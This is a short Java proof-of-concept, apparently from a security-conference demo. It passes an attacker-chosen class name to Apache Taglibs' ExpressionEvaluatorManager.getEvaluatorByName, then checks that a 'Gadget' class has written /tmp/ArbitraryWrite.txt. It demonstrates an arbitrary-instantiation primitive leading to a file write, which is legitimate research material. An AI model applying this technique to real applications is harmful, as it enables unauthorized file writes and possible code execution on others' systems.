package ru.offzone.demo;

import java.io.File;
import java.nio.file.*; 

public class Main0 {
  public static String FILENAME = "/tmp/ArbitraryWrite.txt";

  public static void main(String[] args) throws Throwable {
    Files.deleteIfExists(Paths.get(FILENAME));
    if (new File(FILENAME).isFile()) {
      throw new AssertionError("File exists");
    }

    try {
      org.apache.taglibs.standard.lang.support.ExpressionEvaluatorManager.getEvaluatorByName("ru.offzone.demo.Gadget");     	
    } catch (Exception e) {}
        
    if (!(new File(FILENAME).isFile())) {
      throw new AssertionError("File not created");
    }
    System.out.println("Validate OK");
  }
}